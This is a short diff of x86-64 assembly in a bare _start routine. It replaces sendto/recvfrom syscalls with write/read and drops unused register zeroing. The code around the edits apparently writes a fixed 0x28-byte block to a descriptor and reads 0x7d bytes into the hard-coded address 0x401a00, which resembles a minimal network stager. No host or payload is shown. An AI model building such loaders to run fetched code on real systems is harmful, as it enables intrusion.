@@ -52,13 +52,10 @@ _start:
 	syscall
 	cmpl	$0xffffffff,%eax
 	je	.L2
-	movl	$0x2c,%eax
+	movl	$1,%eax
 	movl	0x58(%rsp),%edi
 	leaq	(%rsp),%rsi
 	movl	$0x28,%edx
-	xorl	%r10d,%r10d
-	xorl	%r8d,%r8d
-	xorl	%r9d,%r9d
 	syscall
 	cmpl	$0x28,%eax
 	jne	.L2
@@ -70,13 +67,10 @@ _start:
 	movl	$0x7d,0x38(%rsp)
 	movq	$0x401a00,0x30(%rsp)
 .L4:
-	movl	$0x2d,%eax
+	xorl	%eax,%eax
 	movl	0x58(%rsp),%edi
 	movq	0x30(%rsp),%rsi
 	movl	0x38(%rsp),%edx
-	xorl	%r10d,%r10d
-	xorl	%r8d,%r8d
-	xorl	%r9d,%r9d
 	syscall
 	addl	%eax,0x30(%rsp)
 	subl	%eax,0x38(%rsp)
